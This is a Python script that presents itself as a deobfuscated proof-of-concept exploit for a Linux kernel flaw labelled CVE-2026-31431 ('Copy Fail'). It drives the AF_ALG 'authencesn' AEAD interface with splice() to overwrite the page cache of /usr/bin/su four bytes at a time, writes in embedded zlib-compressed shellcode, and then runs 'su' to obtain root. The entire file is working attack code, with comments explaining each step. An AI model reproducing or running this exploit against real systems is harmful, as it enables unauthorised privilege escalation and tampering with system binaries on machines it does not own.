#!/usr/bin/env python3
"""
Copy Fail (CVE-2026-31431) — deobfuscated, readable version.
Original: https://copy.fail/
Logic is identical to the 732-byte PoC; only formatting and naming changed.
"""

import os
import socket
import zlib

AF_ALG = 38
SOCK_SEQPACKET = 5
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_OP = 2
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_SET_IV = 3
ALG_OP_DECRYPT = 0x10
MSG_MORE = 32768

AEAD_AUTHSIZE = 4
ASSOCLEN = 8

TARGET_BINARY = "/usr/bin/su"

AES_KEY = bytes.fromhex(
    "0800010000000010" + "0" * 64
)

COMPRESSED_SHELLCODE = bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c"
    "301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10"
    "f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
)


def page_cache_write(target_fd, offset, four_bytes):
    """
    Exploit authencesn's scratch write to overwrite 4 bytes in the
    page cache of the target file at the given offset.

    The 4-byte value comes from AAD bytes [4:8] (seqno_lo in ESN),
    which authencesn writes to dst[assoclen + cryptlen] — a position
    that, via sg_chain, falls into the page cache pages delivered
    by splice().
    """
    alg_sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    alg_sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, AES_KEY)
    alg_sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, AEAD_AUTHSIZE)

    req_sock, _ = alg_sock.accept()

    splice_len = offset + AEAD_AUTHSIZE

    zero = bytes.fromhex("00")
    iv = zero * 4                          # 4-byte IV (zeroed)
    op_decrypt = b'\x10' + zero * 19       # ALG_OP_DECRYPT (0x10) + padding
    assoclen_buf = b'\x08' + zero * 3      # assoclen = 8, little-endian u32

    aad = b"A" * 4 + four_bytes            # bytes[0:4] = seqno_hi (don't care)
                                           # bytes[4:8] = seqno_lo (the payload)

    req_sock.sendmsg(
        [aad],
        [
            (SOL_ALG, ALG_SET_IV, iv),
            (SOL_ALG, ALG_SET_OP, op_decrypt),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, assoclen_buf),
        ],
        MSG_MORE,
    )

    pipe_r, pipe_w = os.pipe()
    os.splice(target_fd, pipe_w, splice_len, offset_src=0)
    os.splice(pipe_r, req_sock.fileno(), splice_len)

    try:
        req_sock.recv(ASSOCLEN + offset)
    except OSError:
        pass


def main():
    shellcode = zlib.decompress(COMPRESSED_SHELLCODE)

    target_fd = os.open(TARGET_BINARY, os.O_RDONLY)

    for i in range(0, len(shellcode), 4):
        chunk = shellcode[i : i + 4]
        page_cache_write(target_fd, i, chunk)

    os.system("su")


if __name__ == "__main__":
    main()
